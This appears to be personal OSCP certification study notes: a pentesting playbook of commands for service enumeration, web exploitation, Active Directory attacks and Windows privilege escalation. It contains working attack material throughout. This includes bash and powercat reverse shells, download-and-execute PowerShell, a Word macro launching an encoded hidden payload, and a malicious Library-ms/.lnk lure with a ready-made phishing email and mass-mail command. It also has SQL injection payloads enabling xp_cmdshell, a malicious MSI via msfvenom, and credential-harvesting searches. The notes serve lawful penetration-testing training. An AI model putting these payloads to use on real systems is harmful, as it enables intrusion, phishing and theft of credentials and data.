OSCP Playbook



## General

### Tools Download

```
iwr -uri IP:8080/mimikatz_x64.exe -Outfile C:\Tools\mimikatz.exe

iwr -uri IP:8080/nc.exe -Outfile C:\Tools\nc.exe

IP:8080/ncat
IP:8080/powercat.ps1
IP:8080/nc64.exe

PE
	IP:8080/Privilege_Escalation/linpeas.sh

	IP:8080/Privilege_Escalation/PrivescCheck.ps1
	IP:8080/Privilege_Escalation/winPEASx64.exe

AD
	IP:8080/Active_Directory/SharpHound.ps1
	IP:8080/Active_Directory/PowerView.ps1
	IP:8080/Active_Directory/PowerUp.ps1
	IP:8080/Active_Directory/Rubeus.exe

Tunneling
	IP:8080/Tunnelling/ligolo-ng_agent_0.4.3_win64.exe

```



### File Transfer

start a http server with upload https://gist.github.com/UniIsland/3346170

```
python SimpleHTTPServerWithUpload.py 8080
```



1. win -  downloads files

   ```
   # Powershell
   iwr -Uri http://192.168.45.170/nc.exe -OutFile C:\Windows\Tools\nc.exe
   
   # CMD
   certutil -urlcache -f http://10.10.85.141:1235/hash hash
   ```

2. win - upload files

   ```
   (New-Object System.Net.WebClient).UploadFile('http://192.168.45.195/', 'C:\Tools\supersecret.txt')
   ```

   

3. linux- download files

   ```
   wget 192.168.45.170/File
   wget 192.168.45.170/File -O xxxx
   ```

   

4. linux - upload files

   ```
   curl -F 'file=@/home/kali/Documents/pwk2.ovpn' http://192.168.45.170/
   ```

   

   ```
   scp <source_user>@<source_host>:<file> <destination_user>@<destination_host>:<file>
   scp -r <source_user>@<source_host>:<directory> <destination_user>@<destination_host>:<directory>
   ```

   

   ```
   nc -nlvp 4444 > incoming.exe
   nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
   ```



### Misc

Find Flag

```
# Powershell
Get-ChildItem -Path C:\Users\ -Include local.txt, proof.txt -File -Recurse -ErrorAction SilentlyContinue

# CMD
powershell -c "Get-ChildItem -Path C:\Users\ -Include local.txt, proof.txt -File -Recurse -ErrorAction SilentlyContinue"
```



Check the current shell

```
ps -p $$

echo $0		# displays the name of the current shell or script
```



Import Module

```
# Import PowerShell Script
. .\powercat.ps1
Import-Module .\PowerView.ps1

# Download a Script from URL and Run it
iex (New-Object System.Net.Webclient).DownloadString('https://IP/powercat.ps1')
```



On Windows, have system priv -> change password

```
net user poultryadmin OffSecHax1!
```



Searchsploit

```
searchsploit -m file		# mirror exploit
searchsploit -x file		# examine exploit
```



Extract Metadata Info

```
exiftool "Windows Event Forwarding.docx"
```



Kali: Microsoft Office Word

```
libreoffice xxx.docx
```



WADComs - interactive cheat sheet - https://wadcoms.github.io/





## Vulnerability Scanning

```
sudo rustscan --ulimit 5000 -a IP -- -v -n -Pn --script "default,safe,vuln" -sV -oA tcp-all
```

- **AutoRecon**

  ```
  /home/kali/.local/bin/autorecon
  
  autorecon 10.10.10.3
  autorecon -t targets.txt	# mulit-target scans
  
  autorecon 192.168.154.130 --only-scans-dir	# only generate scan folder
  autorecon 192.168.126.133 --single-target	# not generate folder with ip name
  
  
  autorecon 192.168.126.133 --nmap-append sS
  	--nmap-append	# add parameters but not override Default: -vv --reason -Pn -T4
  	--nmap-append='--min-rate 1000'
  	-v	
  	--dirbuster.wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
  	
  sudo $(which autorecon) [OPTIONS]
  
  sudo $(which autorecon -v 192.168.154.130 --single-target
  ```

  - remember to check udp port manually since autorecon will only check top 100 udp ports
  
   Go into the output directory after the scan is done and do
  
  ```
  python3 -m http.server 8081
  ```
  
  then just click the link to browse the results like a website





## Common Port

### TCP

#### Port 21 (FTP)

- Check version, older version might be vulnerable

  - ProFTPD-1.3.3c Backdoor
  - ProFTPD 1.3.5 Mod_Copy Command Execution
  - VSFTPD v2.3.4 Backdoor Command Execution

- Check anonymous login

- Default Credentials

  ```
  hydra -l $user -P /usr/share/john/password.lst ftp://$ip:21
  ```

  

Scanning

```
### Nmap Script Enumeration
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $ip

nmap --script=ftp-* -p 21 $ip
```



#### Port 22 (SSH)

1. check authentication method

   1. **/etc/ssh/sshd_config**

      ```shell
      PasswordAuthentication=yes
      PubkeyAuthentication=no
      ```

   2. Bash scripts

      ```bash
      ssh -v -n \
        -o Batchmode=yes \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        DOES_NOT_EXIST@localhost
      ```

      check something like this

      ```bash
      debug1: Authentications that can continue: publickey,password,keyboard-interactive
      ```

2. Vulnerable Version - 7.2p1

3. Configuration Files

   ```
   ssh_config
   sshd_config
   authorized_keys
   ssh_known_hosts
   .shosts
   ```

4. Algorithm

   ```
   id_rsa
   id_ecdsa
   id_ed25519
   id_dsa
   id_ed25519_sk
   id_ecdsa_sk
   ```

5. Bruteforce 

   ```
   hydra -v -V -l root -P pass.txt $ip ssh
   hydra -L user.txt -P pass.txt $ip ssh
   ```



#### Port 25 (SMTP)

- verify user

  ```
  kali@kali:~$ nc -nv 10.11.1.217 25
  (UNKNOWN) [10.11.1.217] 25 (smtp) open
  220 hotline.localdomain ESMTP Postfix
  VRFY root
  252 2.0.0 root
  VRFY idontexist
  550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
  ^C
  ```

  

- verify email

  ```
  telnet 10.10.10.77 25
  
  HELO xxx.com
  
  MAIL FROM: <asfa@asf.com>
  250 OK
  RCTP TO: <nico@megabank.com>
  250 OK
  ```

  




#### Port 80 (HTTP)

Vulnerable

- apache 2.4.49-50



1. HTTP Header/CMS/Module Version/



Directory Scanning

```
dirb http://localhost:8000 path/to/wordlist.txt -X txt,aspx,php,html -r -w
	-r		# non-recursively

gobuster dir -u Scheme://IP:PORT/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 404,302 -x aspx,txt,html,php
	-b		# status-codes-blacklist string

# proxychains & dirb
proxychains4 -q dirb http://localhost:8000 path/to/wordlist.txt -w
	-w 		# not stop by warninng

proxychains4 -q dirb http://172.16.132.7/ path/to/wordlist.txt -w

feroxbuster -u http://ms01.oscp.exam:8080/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -e -r
```



Software Vuln

- when encountering an app that requires login, `google <app name> default login`, and try it with

  ```
  admin:admin
  user:user
  product_name:product:name
  ```

- When encounter any app, other than searchsploit, do a 

  - `<app name> github exploit`
  - `hacktricks <app name>`
  - `<app name> exploit cve`



**WordPress**

```shell
WPScan
wpscan --url sandbox.local --enumerate ap,at,cb,dbe

wpscan --url http://192.168.241.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```

```
linPEAS.sh
	- Analyzing Wordpress Files
	OR
	- check wp-config.php file
		/var/www/html/wp-config.php
```

- Plugin with known vuln

  ```
  wp-survey-and-poll 1.5.7.3
  Duplicator 1.3.26
  ```
  
  
  
- common directory

  ```
  /wordpress/wp-admin
  /wp-admin
  /wp-content
  /wp-includes
  ```
  
  

After getting admin access https://www.hackingarticles.in/wordpress-reverse-shell/

```
Tools -> SiteHealth 		# Read Wordpress Version & other info

Plugins
	/usr/share/seclists/Web-Shells/WordPress/plugin-shell.pip
	sudo zip plugin-shell.zip plugin-shell.php
	### upload new plugins -> install it
	curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
	### msfvenom generate reverse sehll
	### use cmd to download it, chmod and execute
	
	
appearance -> edit template -> modify 404.php
	trigger it by access 
		http://192.168.1.101/wordpress/wp-content/themes/twentyfifteen/404.php
```







#### Port 88 (Kerberos)

Domain Controller

```
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=<Domain>,userdb=<Wordlist> <IP>

./kerbrute userenum <UserList> --dc <IP> --domain <Domain>

# with a list of users
.\Rubeus.exe brute /users:<UserList> /passwords:<Wordlist> /domain:<Domain>

# Check all domain users again password list
.\Rubeus.exe brute /passwords:<Wordlist>
```



#### Port 135 (RPC)

```
# Null-authentication
rpcclient -U '' 10.10.10.172

rpcclient $> enumdomusers		# use rpcclient to enum domain users
rpcclient $> querydispinfo		# use rpcclient to dump AD Info
rpcclient $> enumdomgroups /querygroupmen	# use rpcclient to enumerate members of contractors gropu

```



#### Port 139/445 (SMB)

1. Scanning
   
   ```
   ls -1 /usr/share/nmap/scripts/smb*
   
   # Enumerate shares
   nmap --script smb-enum-shares -p 445 <IP>
   # OS Discovery
   nmap --script smb-os-discovery -p 445 <IP>
   # Enumerate Users
   nmap --script=smb-enum-users -p 445 <IP>
   # All
   nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -p 139,445 <IP>
   
   ```
   
2. NULL / Anonymous Login

   ```
   # On some configuration omitting '-N' will grant access.
   smbclient -U '' -L \\\\<IP> 
   
   smbclient -U '' -N -L \\\\<IP> 
   smbclient -U '%' -N -L \\\\<IP>
   smbclient -U '%' -N \\\\<IP>\\<Folder>
   
   # Enter a random username with no password and try for anonymous login.
   crackmapexec smb <IP> -u 'anonymous' -p ''
   
   crackmapexec smb <IP> -u '' -p ''
   crackmapexec smb <IP> -u '' -p '' --shares
   ```
   
    
   
2. list shares

   ```
   smbclient -L //<IP>
   smbclient -L \\\\<IP> -U domain/USER --password=PASS
   
   smbmap -H IP			# list permission we have
   smbmap -H 10.10.122.146 -u '' -p ''		# null authentication
   smbmap -H 10.10.122.146 -u WEB_SVC -p 'Diamond1' -d oscp.exam
   	-R		# Recursively
   	
   	
   crackmapexec smb 10.10.10.175
   crackmapexec smb 10.10.10.161 --pass-pol
   crackmapexec smb 10.10.10.175 --shares
   crackmapexec smb 10.10.10.175 --shares -u '' -p '' # null authentication
   ```

   

   ```
   smbclient -p 4455 //192.168.50.63/ -U USER --password=PASS
   smbclient \\\\<IP>\\<SHARE> -U USER --password=PASS
   smbclient \\\\<IP>\\<SHARES> -U XXXX --pw-nt-hash <hash>
   
   smbmap -R someShare -H IP
   smbmap -R someShare -H IP -A file -q
   smbmap -d active.htb -u svc_tgs -p pass -H ip -R
   ```

4. SMB Download Files

   ```
   smbclient //10.10.10.100/xxx
   
   # Recursively download files
   	recurse ON
   	prompt OFF
   	mget *
   	
   smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 --download share/path/file
   ```



On windows

```
net view \\dc01 /all
```





Mount the shares

```
umount /mnt
mount -t cifs ''//10.10.10.103/Shares' /mnt		# mount the share
```



#### Port 389 (LDAP)

Nmap

```
# No Credentials, see what can be pulled
nmap -n -sV --script "ldap* and not brute" <IP>  
```

ldapdomaindump

```
# With Credentials
ldapdomaindump -u security.local\\<User> -p '<Password>' ldap://<IP>

# Without credentials
ldapdomaindump ldap://<IP>
```

ldapsearch

```
# Get all users
ldapsearch -x -H ldap://<IP> -D '<Domain>\<User>' -w '<Password>' -b 'DC=security,DC=local'

# Get all users and cleanup output
ldapsearch -x -H ldap://<IP> -D '<Domain>\<User>' -w '<Password>' -b 'DC=security,DC=local' | grep userPrincipalName | sed 's/userPrincipalName: //'

# Without credentials
ldapsearch -x -H ldap://<IP> -b 'DC=security,DC=local'
ldapsearch -x -H ldap://<IP> -b 'DC=security,DC=local' | grep userPrincipalName | sed 's/userPrincipalName: //'
```



#### Port 1433 (MSSQL)

Linux

1. login

   ```
   sqsh -U oscp.exam\\sql_svc -P 'Dolphin1' -S 10.10.122.148:1433
   ```

2. Enable XP Command Shell Option if not enabled

   ```shell
   EXEC sp_configure 'show advanced options', 1;
   EXEC sp_configure 'xp_cmdshell', 1;
   RECONFIGURE;
   go
   xp_cmdshell 'whoami';
   go
   ```

   

3. Execute Commands

   ```mssql
   1> xp_cmdshell 'whoami';
   2> go
   ```




Windows

```
sqlcmd -Q "cmdline query"

sudo responder -I tun0
sqlcmd -Q "xp_dirtree '\\10.10.14.2\test'"
	#  get a password hash - can't bruteforce
```



#### Port 3306 (MySQL / Maria DB)

https://gabb4r.gitbook.io/oscp-notes/service-enumeration/mysql-port-3306

```
mysql -u [username] -p[password] -h [hostname] -P [port] [database]

mysql --host=127.0.0.1 --port=13306 --user=wp -p
```

- Local Access

  ```
  mysql -u root 
  # Connect to root without password
  
  mysql -u root -p 
  # A password will be asked
  
  # Always test root:root credential
  ```

  

- Remote Access

  ```
  mysql -h <Hostname> -u root
  
  mysql -h <Hostname> -u root@localhost
  ```

  

#### Port 5432 (PostgreSQL)

Once you have username and password

1. connect

   ```
   psql -h 192.168.50.63 -p 2345 -U postgres
   ```

   - `-h` hostname

   - `-U` Username

2. `\l`  list available databases

   `\c <databaseName>` connect to database

3. iterate tables - get hashed credentials

   ```
   select * from cwd_user;
   ```

4. use hashcat to crack it



### UDP

#### Port 53 (DNS)

```
host hostname [name server]
host -a hostname [name server]
host -t ns $ip
host -t txt $ip
host -t mx $ip

host -l <domainName/IP> [nameServerIP]		# DNS Zone Transfer

dnsenum [domain]

dnsrecon -d [domain] -t std/axfr
```



```
nslookup
server 10.10.10.103
> 127.0.0.1

> 10.10.10.103
(hanging)

> HTB.LOCAL
```



if you are in a windows domain

```
nslookup INTERNALSRV1.BEYOND.COM
```



#### Port 161 (SNMP)

- Brute force community string

  ```
  nmap --script=snmp-brute <target>
  			  snmp-interfaces
  
  hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target-ip> snmp
  
  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <target-ip>
  ```

- Once you have a valid community string

  ```
  snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP]
  snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] 1.3.6.1.2.1.4.34.1.3
  
  snmp-check [DIR_IP] -p [PORT] -c [COMM_STRING]
  nmap --script=<snmp-xxx> <target>
  ```

- Extended Queries

  ```
  snmpwalk -<version> -c <CommunityString> <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
  
  snmpwalk --<version> -c <CommunityString> <IP>  NET-SNMP-EXTEND-MIB::nsExtendObjects  
  ```

  



## Common Vuln

### 1. Directory Traversal

### 2. File Inclusion

```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```



SSH Private Key Name

```
id_rsa
id_ecdsa
id_ed25519
id_dsa
id_ed25519_sk
id_ecdsa_sk
```

```shell
# 1
for host in id_rsa id_ecdsa id_ed25519 id_dsa id_ed25519_sk id_ecdsa_sk;
do 
	echo $host && ./apache_2.4.49_rce.sh targetst.xt /home/offsec/.ssh/$host;
done

# 2
for host in id_rsa id_ecdsa id_ed25519 id_dsa id_ed25519_sk id_ecdsa_sk;
do
    for user in $(cat creds.txt);
    do
        echo $user $host && python 50420.py http://192.168.241.244 /home/$user/.ssh/$host;
    done 
done
```







### 3. File Upload

### 4. SQLi

- MySQL

  ```
  # connect from kali
  mysql -u root -p'root' -h 192.168.50.16 -P 3306
  
  # check sql version
  select version();
  
  # check current database user
  select system_user();
  
  # check databases
  show databases;
  
  # select databases;
  use <database>;
  
  # show tables;
  show tables;
  
  # check tables columns;
  show columns from <table>;
  
  select table_name from information_schema.tables
  select column_name from information_schema.columns where table_name='users'
  
  offsec' OR 1=1 -- //
  ' OR 1=1 in (SELECT * FROM users) -- //
  
  ' OR 1=1 in (SELECT database()) -- //
  ' OR 1=1 in (SELECT schema_name FROM information_schema.schemata) -- //
  
  ' OR 1=1 in (SELECT table_name FROM information_schema.columns where table_schema = "offsec") -- //
  
  ' OR 1=1 in (SELECT column_name FROM information_schema.columns where table_schema ="offsec" and table_name = "users") -- // 
  
  ' OR 1=1 in (SELECT username FROM information_schema.columns where table_schema ="offsec" and table_name = "users") -- // 
  
  ' OR 1=1 in (SELECT password FROM information_schema.columns where table_schema ="offsec" and table_name = "users") -- //
  
  # check the number of columns
  ' ORDER BY 1-- //
  ' ORDER BY 1,2-- //
  ...
  
  %' UNION SELECT database(), user(), @@version, null, null -- //
  
  ' UNION SELECT null, null, database(), user(), @@version  -- //
  
  ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
  
  ' UNION SELECT null, username, password, description, null FROM users -- //
  ```

  

- MSSQL

  ```
  # connect from kali
  impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
  
  # check version
  SELECT @@version;
  
  # list databases
  SELECT name FROM sys.databases;
  
  # list tables from one database
  SELECT * FROM offsec.information_schema.tables;
  
  # inspect tables
  select * from offsec.dbo.users;
  
  # AFTER LOGIN THE DATABASE
  2. EXECUTE sp_configure 'show advanced options', 1;
  3. RECONFIGURE;
  4. EXECUTE sp_configure 'xp_cmdshell', 1;
  5. RECONFIGURE;
  
  # with xp_cmdshell enabled, we can execute any Windows shell command through the EXECUTE statement
  EXECUTE xp_cmdshell 'whoami';
  
  # OR NOT LOGIN IN
      ADMIN'; EXECUTE sp_configure 'show advanced options', 1; WAITFOR DELAY '0:0:10' -- //
      ADMIN'; RECONFIGURE; WAITFOR DELAY '0:0:10' -- //
      ADMIN'; EXECUTE sp_configure 'xp_cmdshell', 1; WAITFOR DELAY '0:0:10' -- //
      ADMIN'; RECONFIGURE; WAITFOR DELAY '0:0:10' -- //
      
      ADMIN'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; WAITFOR DELAY '0:0:10' --
      
      ADMIN'; EXEC xp_cmdshell 'whoami'; WAITFOR DELAY '0:0:10' -- //
      
      ADMIN';IF CHARINDEX('Microsoft SQL Server', @@version) > 0 WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' -- verify it is MSSQL
  ```

  

### 5. Client-Side Attack

1. **Microsoft Word Macro**

   save the file with word 97-2003 doc

   1. VB Script

      ```
      Sub AutoOpen()
      
        MyMacro
        
      End Sub
      
      Sub Document_Open()
      
        MyMacro
        
      End Sub
      
      Sub MyMacro()
      
      	Dim Str As String
          
          Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
              Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
              Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
          ...
              Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
              Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
              Str = Str + "A== "
      
        CreateObject("Wscript.Shell").Run "powershell"
        
      End Sub
      ```

      

   2. Python split script

      ```
      str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
      
      n = 50
      
      for i in range(0, len(str), n):
      	print("Str = Str + " + '"' + str[i:i+n] + '"')
      ```

      

2. **Windows Library**

   1. set up WebDAV share

      ```
      /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
      ```

   2. create **config.Library-ms** file - change url

      ```Library-ms
      <?xml version="1.0" encoding="UTF-8"?>
      <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
      <name>@windows.storage.dll,-34582</name>
      <version>6</version>
      <isLibraryPinned>true</isLibraryPinned>
      <iconReference>imageres.dll,-1003</iconReference>
      <templateInfo>
      <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
      </templateInfo>
      <searchConnectorDescriptionList>
      <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
      <url>http://192.168.45.170</url>
      </simpleLocation>
      </searchConnectorDescription>
      </searchConnectorDescriptionList>
      </libraryDescription>
      ```

   3. create a .lnk shortcut file to trigger the reverse shell

      name it **automatic_configuration** 

      ```
      powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.195:8080/powercat.ps1'); powercat -c 192.168.45.195 -p 4444 -e powershell"
      
      powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.195:8080/powercat.ps1'); powercat -c 192.168.45.195 -p 4444 -e cmd"
      ```

   4. write pretext
   
      ```
      Hello! My name is Dwight, and I'm a new member of the IT Team. 
      
      This week I am completing some configurations we rolled out last week.
      To make this easier, I've attached a file that will automatically
      perform each step. Could you download the attachment, open the
      directory, and double-click "automatic_configuration"? Once you
      confirm the configuration in the window that appears, you're all done!
      
      If you have any questions, or run into any problems, please let me
      know!
      ```
      
   5. Phisihing
   
      ```
      sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.241.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
      ```
   
      



## Privilege Escalation

### Win PE

#### 5. History

```
Get-History
(Get-PSReadlineOption).HistorySavePath
```



#### 1. Basic Enumeration

```
systeminfo
hostname

set
```



```
whoami
	whoami /groups
	whoami /priv
	whoami /all

### Use PrintSpoofer& Juicypotato & SweetPotato
SeImpersonatePrivilege
	./PrintSpoofer.exe -c "c:\tools\nc.exe 192.168.45.170 1002 -e cmd	# Windows 10 and Server 2016/2019

SeBackupPrivilege
SeRestorePrivilege

SeAssignPrimaryToken
SeLoadDriver
SeDebug
```

- If we're part of an interesting group such as DndAdmins, Check HackTricks & Google the group, and follow instructions



#### 2. Common Directories & Sensitive Files

`C:\` & `C:\Users`

View hidden files

```
CMD: dir /a
PowerShell: Get-ChildItem -Force
```



- Exploit password manager file

  ```
  # Search for password manager databases
  Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
  ```

  

- Exploit SAM

  ```
  Get-ChildItem -Path C:\ -Include SAM, SYSTEM -File -Recurse -ErrorAction SilentlyContinue
  impacket-secretsdump -sam SAM -system SYSTEM LOCAL
  	-history
  ```
  
  For DC, search `ntds.dit` & `SYSTEM`
  
  For normal machines, search `SAM` & `SYSTEM`
  
  
  
- .git folder

  ```
  dir /s /b /a:d | findstr "\.git$"
  
  git log		# show us the commit log
  git show <commit>	# show us the content of a commit
  ```

- lsass.zip / lsass

#### 3. Enumerate Users & Groups

```
# CMD
net user 
    net user xxx 
    net user /domain
    net user xxx /domain

# check what users are in local administrators
net localgroup Administrators

# POWERSHELL
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember <group>
```



#### 4. Ip address & network

```
ipconfig
netsh interface ip show config
route print

netstat -ano
```





#### 6. Installed Application

- 32-bit applications

  ```powershell
  Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,displayversion
  ```

  

- 64-bit applications

  ```powershell
  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,displayversion
  ```

- Check directories in `C:\`

  

- Check **Downloads** directory



**Known Vulnerable Application**

-  Putty

  ```cmd
  # Either of two
  reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
  
  regedit /e "%USERPROFILE%\Desktop\putty-sessions.reg" HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
  ```
  
  

#### 7. Service

1. Unqoted Service Path

2. Service Binary Hacking

3. Service DLL Hijacking

   - install services

     ```
     sc.exe create "Scheduler" binpath= "C:\Scheduler\scheduler.exe
     sc start Scheduler
     ```

4. Insecure Service Permissions

   

- **search services**

  ```
  Get-CimInstance -ClassName win32_service | Select Name,State,PathName
  Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
  Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\Windows\system32\*')}
  
  Get-Service | Select-Object -Property Name, Status, DisplayName
  Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -Property Name, Status, DisplayName
  
  # CMD
  wmic service get name,displayname,pathname,startmode
  wmic service get name,displayname,pathname,startmode | findstr /i "auto"
  wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"		#/v - ignore anything that contains the string "c:\windows"
  
  ### Check Unquoted Service
  
  wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
  wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
  
  
  
  # PowerUp.ps1
  Get-ModifiableServiceFile
  Get-UnquotedService
  ```

   the `Get-Service` cmdlet does not provide a `PathName` property,

  

- **check startmode** 

  ```
  # check startmode
  Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
  ```

  

- **check permission**

  ```
  icacls C:\xxx
  ```

  ```
  # Check Folder Owner
  icacls xxx
  	CREATOR OWNER:(I)(OI)(CI)(IO)(F)
  
  $folderPath = "C:\Program Files\Kite"
  $folderAcl = Get-Acl -Path $folderPath
  $folderAcl.Owner
  
  ```

  

- **restart service**

  ```
  # CMD
  net stop service
  net start service
  
  sc stop xxx
  sc start xxx
  
  # Powershell 
  Restart-Service <service>
  Start-Service <service>
  Stop-Service <service>
  
  # if have SeShutDownPrivilege
  shutdown /r /t 0 
  ```

  

#### 8. Scheduled Tasks

```
schtasks
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v /tn taskname					# /tn - specify the task to query
schtasks /query /fo LIST /v | findstr /v "Microsoft"		# /v - exclude the certain task

Get-ScheduledTask | Where-Object { $_.NextRunTime -ne "N/A" } 
Get-ScheduledTask | ft TaskName,TaskPath,State
Get-ScheduledTask -TaskName "Your Task Name"
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```



#### 9. Automtaed

- PrivescCheck.ps1

  ```
  powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
  powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
  powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"
  ```

  - check Autologon

- winPEAS.exe

  ```
  winPEAS.exe windowscreds
  winPEAS.exe filesinfo
  ```

  - check Autologon
  
- PowerUp.ps1

  ```
  iex(new-object net.webclient).downloadstring('http://ip/Active_Directory/PowerUp.ps1');Invoke-AllChecks
  
  Or
  
  1. download powerup.ps1
  2. Import-Module .\PowerUp.ps1
  3. Invoke-AllChecks
  ```

  Or Separated

  - Misc

    ```
    # Check for credentials in unattend.xml files
    Get-UnattendedInstallFile
    
    # Get cleartext credentials and encrypted strings from web config files
    Get-Webconfig
    
    # Get current user tokens and privileges
    Get-ProcessTokenPrivilege
    ```

    

  - Services

    ```
    # Get services with unquoted paths and spaces
    Get-ServiceUnquoted -Verbose
    
    # Get services where current user can write to binary path
    Get-ModifiableServiceFile -Verbose
    
    #Get the services whose configuration the current user can modify
    Get-ModifiableService -Verbose
    
    # Exploit vulnerable service 
    Invoke-ServiceAbuse -Name "Vuln-Service" -Command "net localgroup Administrators security.local\moe /add"
    ```

    

  - Registry

    ```
    # Checks if MSI files are always installed in context of SYSTEM
    Get-RegistryAlwaysInstallElevated
    
    # Checks if any autologon credentials exists in registry locations
    Get-RegistryAutologon
    
    # Gets autoruns where the current user can modify the script or binary
    Get-ModifiableRegistryAutoRun
    ```

    

  



#### 10. Misc

1. **"AlwaysInstallElevated"**

   ```
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```

   If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY\SYSTEM.

   ```
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_ip LPORT=LOCAL_PORT -f msi -o malicious.msi
   ```

   Execute 

   ```
   msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
   ```

   

2. **stored credentials** (windows vault / credentials manager)

   ```
   cmdkey /list
   ```

   Then using stored credentials with `runas` to get a cmd

   ```
   runas /savecred /user:admin cmd.exe
   runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
   ```

   

3.  **Passwords**

   1. Windows Installation Files - sometimes it will contain an administrator password

      common locations

      ```powershell
      C:\Unattend.xml
      C:\Windows\Panther\Unattend.xml
      C:\Windows\Panther\Unattend\Unattend.xml
      C:\Windows\system32\sysprep.inf
      C:\Windows\system32\sysprep\sysprep.xml
      
      # search for specific keyword in txt file
      findstr /si password *.txt
      findstr /si password *.xml
      findstr /si password *.ini
      findstr /si password *.xml *.ini *.txt
      	/s		# search in all subdirectories
      	
      #Find all those strings in config files in the file names.
      dir /s *pass* == *cred* == *vnc* == *.config*
      
      # Find all passwords in all files.
      findstr /spin "password" *.*
      findstr /spin "password" *.*
      ```
   
      
   
   2. Registry
   
      ```powershell
      # VNC
      reg query "HKCU\Software\ORL\WinVNC3\Password"
      
      # Windows autologin
      reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
      
      # SNMP Paramters
      reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
      
      # Search for password in registry - very inefficient
      reg query HKLM /f password /t REG_SZ /s
      reg query HKCU /f password /t REG_SZ /s
      ```
   
      
   
   3. Sensitive Files
   
      ```
      # search for documents and text files in the home directory of the user *dave*
      Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
      ```
      
   4. Find string pass under some directory
   
      ```
      findstr /S /I /N /C:"pass" C:\inetpub\wwwroot\*
      ```
   
      




#### 11. Firewall

```
# CMD
netsh advfirewall show currentprofile
